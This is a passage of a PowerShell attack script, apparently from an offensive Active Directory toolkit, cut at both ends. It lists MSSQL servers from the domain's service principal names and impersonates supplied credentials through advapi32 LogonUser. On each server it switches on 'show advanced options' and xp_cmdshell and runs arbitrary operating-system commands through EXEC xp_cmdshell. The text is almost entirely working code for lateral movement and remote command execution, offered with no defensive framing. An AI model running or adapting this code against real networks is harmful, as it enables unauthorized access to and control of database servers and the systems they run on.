            # Use New-Searcher function to create the DirectorySearcher object
            $ADSearcher = New-Searcher
            $ADSearcher.Filter = $LDAPFilter
            $ADSearcher.SearchScope = "Subtree"
    
            try {
                $Results = $ADSearcher.FindAll()
                foreach ($Result in $Results) {
                    $Entry = $Result.GetDirectoryEntry()
                    $SPNs = $Entry.servicePrincipalName
                    foreach ($SPN in $SPNs) {
                        if ($SPN.StartsWith("MSSQLSvc/")) {
                            $InstanceDetails = $SPN.Replace("MSSQLSvc/", "").Split(":")
                            $ComputerName = $InstanceDetails[0]
                            $InstanceName = if ($InstanceDetails.Length -gt 1) { $InstanceDetails[1] } else { "Default" }

                            # Combine ComputerName and InstanceName
                            $FullInstanceName = if ($InstanceName -eq "Default" -or $InstanceName -eq "MSSQLSERVER") { 
                                $ComputerName.ToLower() 
                            }
                            else { 
                                "$($ComputerName.ToLower())\$InstanceName" 
                            }

                            # Add the full instance identifier to the AllInstances array
                            $AllInstances += $FullInstanceName
                        }
                    }
                }
            }
            finally {
                $ADSearcher.Dispose()
            }

            # Return the array of all instances
            return $AllInstances
        }

        if (!$IPAddress) { $AllInstances = Get-ADSQLInstances }

        # Poll the runspaces and display results as they complete
        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)

                    if ($result -eq "Unable to connect") { continue }

                    # Foreach result, store it in the AllInstances Array
                    $result | ForEach-Object { $AllInstances += $_ }

                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }

            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })

        # Clean up
        $runspacePool.Close()
        $runspacePool.Dispose()
        $AllInstances = $AllInstances.ToUpper()
        $AllInstances = $AllInstances.Trim()
        $AllInstances = $AllInstances | Select -Unique | Sort-Object

        $MSSQLComputers = $AllInstances | ForEach-Object {
            $computerPart = ($_ -split '\\')[0]
            if ($computerPart -like '*.*') {
                $computerPart
            }
            else {
                $computerPart -split '\.' | Select-Object -First 1
            }
        }

        $UniqueMSSQLComputers = $MSSQLComputers | Sort-Object -Unique
        $FilePath = Join-Path -Path $MSSQL -ChildPath ("MSSQL-" + "All-Discovered-MSSQL-Servers" + ".txt")

        # Read existing entries from the file
        $ExistingEntries = @()
        if (Test-Path -Path $FilePath) {
            $ExistingEntries = Get-Content -Path $FilePath
        }

        # Compare and append only new entries
        $NewEntries = $UniqueMSSQLComputers | Where-Object { $_ -notin $ExistingEntries }
        $NewEntries | Add-Content -Path $FilePath -Encoding ASCII -Force -ErrorAction "SilentlyContinue"

        # Filter out instances not present in [array]$Computers
        $ComputerNames = [array]$Computers | ForEach-Object {
            if ($_.Properties["dnshostname"]) {
                $_.Properties["dnshostname"][0].ToUpper()
            }
            else {
                $_.ToUpper()
            }
        }
        $FilteredInstances = $AllInstances | Where-Object { $ComputerNames -contains $_.Split('\')[0] }

        # Assign the filtered list back to $AllInstances
        $AllInstances = $FilteredInstances

        function Display-ComputerStatus {
            param (
                [string]$ComputerName,
                [string]$OS,
                [System.ConsoleColor]$statusColor = 'White',
                [string]$statusSymbol = "",
                [string]$statusText = "",
                [int]$NameLength,
                [int]$OSLength,
                [string]$IpAddress,
                [string]$NamedInstance
            )

            # Prefix
            Write-Host "MSSQL " -ForegroundColor "Yellow" -NoNewline
            Write-Host "   " -NoNewline
    
            Write-Host ("{0,-16}" -f $IPAddress) -NoNewline
    
            # Display ComputerName, OS, and NamedInstance
            Write-Host ("{0,-$InstanceLength}" -f $NamedInstance) -NoNewline
            Write-Host "   " -NoNewline

            # Display status symbol and text
            Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
            Write-Host $statusText
        }

        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param ($NamedInstance, $Username, $Password, $LocalAuth, $Domain, $Command)

            try {
                Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public enum LogonType : int {
    LOGON32_LOGON_NEW_CREDENTIALS = 9,
}

public enum LogonProvider : int {
    LOGON32_PROVIDER_DEFAULT = 0,
}

public class Advapi32 {
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool LogonUser(
        String lpszUsername,
        String lpszDomain,
        String lpszPassword,
        LogonType dwLogonType,
        LogonProvider dwLogonProvider,
        out IntPtr phToken
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
	
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hToken);
}
"@ -Language CSharp
            }
            Catch {}
            function Invoke-Impersonation {
                param (
                    [Parameter(Mandatory = $false)]
                    [string]$Username,

                    [Parameter(Mandatory = $false)]
                    [string]$Password,

                    [Parameter(Mandatory = $false)]
                    [string]$Domain,
		
                    [Parameter(Mandatory = $false)]
                    [switch]$RevertToSelf
                )
	
                begin {
                    # Check if RevertToSelf switch is NOT provided
                    if (-not $RevertToSelf) {
                        # If any of the mandatory parameters are missing, throw an error
                        if (-not $Username -or -not $Password -or -not $Domain) {
                            Write-Output "[-] Username, Password, and Domain are mandatory unless the RevertToSelf switch is provided."
                            $PSCmdlet.ThrowTerminatingError((New-Object -TypeName System.Management.Automation.ErrorRecord -ArgumentList (New-Object Exception), "ParameterError", "InvalidArgument", $null))
                        }
                    }
                }

                process {
                    if ($RevertToSelf) {
                        if ([Advapi32]::RevertToSelf()) {
                            # Write-Output "[+] Successfully reverted to original user context."
                        }
                        else {
                            # Write-Output "[-] Failed to revert to original user. Error: $($Error[0].Exception.Message)"
                        }
                        return
                    }

                    $tokenHandle = [IntPtr]::Zero

                    # Use the LogonUser function to get a token
                    $result = [Advapi32]::LogonUser(
                        $Username,
                        $Domain,
                        $Password,
                        [LogonType]::LOGON32_LOGON_NEW_CREDENTIALS,
                        [LogonProvider]::LOGON32_PROVIDER_DEFAULT,
                        [ref]$tokenHandle
                    )

                    if (-not $result) {
                        #Write-Output "[-] Failed to obtain user token. Error: $($Error[0].Exception.Message)"
                        return
                    }

                    # Impersonate the user
                    if (-not [Advapi32]::ImpersonateLoggedOnUser($tokenHandle)) {
                        [Advapi32]::CloseHandle($tokenHandle)
                        Write-Output "[-] Failed to impersonate user. Error: $($Error[0].Exception.Message)"
                        return
                    }
                    #Write-Output "[+] Impersonation successful"
                }
            }
            Function Invoke-SqlQuery {
                [CmdletBinding()]
                param(
                    [Parameter(Mandatory = $true)]
                    [string]$NamedInstance,

                    [Parameter(Mandatory = $true)]
                    [string]$Query,

                    [Parameter(Mandatory = $false)]
                    [string]$Username,

                    [Parameter(Mandatory = $false)]
                    [string]$Password
                )

                try {
                    # Create and open a SQL connection
                    $SqlConnection = New-Object System.Data.SqlClient.SqlConnection $ConnectionString
                    $SqlConnection.Open()

                    # Create a SQL command object
                    $SqlCommand = $SqlConnection.CreateCommand()
                    $SqlCommand.CommandText = $Query

                    # Execute the query and return the results
                    $Result = $SqlCommand.ExecuteReader()
                    $Table = New-Object System.Data.DataTable
                    $Table.Load($Result)
                    $Table
                }
                catch {
                    Write-Error "An error occurred: $($_.Exception.Message)"
                }
                finally {
                    # Dispose SQL connection and command
                    if ($SqlCommand -ne $null) {
                        $SqlCommand.Dispose()
                    }
                    if ($SqlConnection -ne $null) {
                        $SqlConnection.Dispose()
                    }
                }
            }
            function MSSQL-Command {
                [CmdletBinding()]
                param (
                    [Parameter(Mandatory = $true)]
                    [string]$NamedInstance,
    
                    [Parameter(Mandatory = $true)]
                    [string]$Command
                )
    
                # Function to revert configurations
                function Revert-Config {
                    param (
                        [string]$Option,
                        [int]$Value
                    )
                    Invoke-SqlQuery -NamedInstance $NamedInstance -Query "sp_configure '$Option', $Value; RECONFIGURE;"
                }

                # Store the initial states
                $advancedOptionsConfig = Invoke-SqlQuery -NamedInstance $NamedInstance -Query "SELECT value_in_use FROM sys.configurations WHERE name = 'show advanced options'"
                $xpCMDConfig = Invoke-SqlQuery -NamedInstance $NamedInstance -Query "SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell'"

                # Enable 'Show Advanced Options' if needed
                if ($advancedOptionsConfig.value_in_use -eq 0) {
                    Invoke-SqlQuery -NamedInstance $NamedInstance -Query "sp_configure 'show advanced options', 1; RECONFIGURE;"
                    $revertAdvancedOptions = $true
                }

                # Enable 'xp_cmdshell' if needed
                if ($xpCMDConfig.value_in_use -eq 0) {
                    Invoke-SqlQuery -NamedInstance $NamedInstance -Query "sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
                    $revertXpCMDShell = $true
                }

                # Execute the provided command using xp_cmdshell
                $ExecResult = Invoke-SqlQuery -NamedInstance $NamedInstance -Query "EXEC xp_cmdshell '$Command';"

                # Output the result as formatted text
                if ($ExecResult) {
                    $TrimmedResult = $ExecResult | Format-Table -HideTableHeaders | Out-String | ForEach-Object { $_.Trim() }
                    $TrimmedResult | Write-Output
    
                }